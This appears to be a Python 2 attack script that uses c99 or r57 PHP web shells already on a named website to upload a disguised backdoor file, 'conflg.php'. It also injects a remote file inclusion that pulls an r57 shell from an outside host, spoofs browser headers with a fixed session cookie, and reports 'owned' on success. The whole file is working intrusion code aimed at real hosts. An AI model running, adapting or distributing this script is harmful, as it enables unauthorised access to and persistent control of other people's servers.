import httplib, mimetypes, random

def post_multipart(host, selector, fields, files, backdoor):
    """
    Post fields and files to an http host as multipart/form-data.
    fields is a sequence of (name, value) elements for regular form fields.
    files is a sequence of (name, filename, value) elements for data to be uploaded as files
    Return the server's response page.
    """
    
    content_type, body = encode_multipart_formdata(fields, files, backdoor)
    h = httplib.HTTP(host)
    h.putrequest('POST', selector)
    h.putheader('HOST', host)
    h.putheader('User-Agent', "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1.9) Gecko/20071025 Firefox/2.0.0.9")
    h.putheader('Accept', "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5")
    h.putheader('Accept-Language', "fr,fr-fr;q=0.8,en-us;q=0.5,en;q=0.3")
    h.putheader('Accept-Encoding', "gzip,deflate")
    h.putheader('Accept-Charset', "ISO-8859-1,utf-8;q=0.7,*;q=0.7")
    h.putheader('Keep-Alive', '300')
    h.putheader('Connection', "keep-alive")
    h.putheader('Referer', "www.nices.com")
    h.putheader('Cookie', "PHPSESSID=29d6f7b6bc7c288aa346735fc24d2f87; hotlog=1")
    h.putheader('content-type', content_type)
    h.putheader('content-length', str(len(body)))
    h.endheaders()
    h.send(body)
    errcode, errmsg, headers = h.getreply()
    return h.file.read()

def encode_multipart_formdata(fields, files, backdoor):
    """
    fields is a sequence of (name, value) elements for regular form fields.
    files is a sequence of (name, filename, value) elements for data to be uploaded as files
    Return (content_type, body) ready for httplib.HTTP instance
    """
    bound=random.randrange(1000000000000,10000000000000)
    BOUNDARY = '-----------------------------'+str(bound)
    CRLF = '\r\n'
    L = []

    if backdoor=='c99':     
        act=[]
        act.append(fields[0])
        rest=fields[1:]
        for (key, value) in act:
            L.append('--' + BOUNDARY)
            L.append('Content-Disposition: form-data; name="%s"' % key)
            L.append('')
            L.append(value)    
        for (key, filename, value) in files:
            L.append('--' + BOUNDARY)
            L.append('Content-Disposition: form-data; name="%s"; filename="%s"' % (key, filename))
            L.append('Content-Type: %s' % get_content_type(filename))
            L.append('')
            L.append(value)
        for (key, value) in rest:
            L.append('--' + BOUNDARY)
            L.append('Content-Disposition: form-data; name="%s"' % key)
            L.append('')
            L.append(value)    
        L.append('--' + BOUNDARY + '--')
        L.append('')
        body = CRLF.join(L)
        content_type = 'multipart/form-data; boundary=%s' % BOUNDARY
        

    elif backdoor=='r57':
        for (key, filename, value) in files:
            L.append('--' + BOUNDARY)
            L.append('Content-Disposition: form-data; name="%s"; filename="%s"' % (key, filename))
            L.append('Content-Type: %s' % get_content_type(filename))
            L.append('')
            L.append(value)
        for (key, value) in fields:
            L.append('--' + BOUNDARY)
            L.append('Content-Disposition: form-data; name="%s"' % key)
            L.append('')
            L.append(value)    
        L.append('--' + BOUNDARY + '--')
        L.append('')
        body = CRLF.join(L)
        content_type = 'multipart/form-data; boundary=%s' % BOUNDARY

    return content_type, body
    
    

def get_content_type(filename):
    #return mimetypes.guess_type(filename)[0] or 'application/octet-stream'
    return mimetypes.guess_type(filename)[0] or 'text/plain'


if __name__=='__main__':
    backdoor="c99"

    host="iberoriente.net"
    
    fd=open('cmd.txt','r')
    text=fd.read()
    filename='conflg.php'
    
    if backdoor=="r57":
        fields=[('new_name',''),('dir','.'),('submit','Upload')]
        files=[('userfile',filename,text)]
        shell="index.php"
    elif backdoor=="c99":
        fields=[('act','Upload'),('miniform','1'),('submit','Upload')]
        files=[('uploadfile',filename,text)]
        shell="c99.php"
    selector="/"+shell+"?page=http://www.ss3s.org/r57.txt?"
    #shell="daimon57.php"
    data=post_multipart(host, selector, fields, files, backdoor)
    print data
    if data.find(filename) != -1:
        print 'owned'
    else:
        print 'Noonwend'
 
    
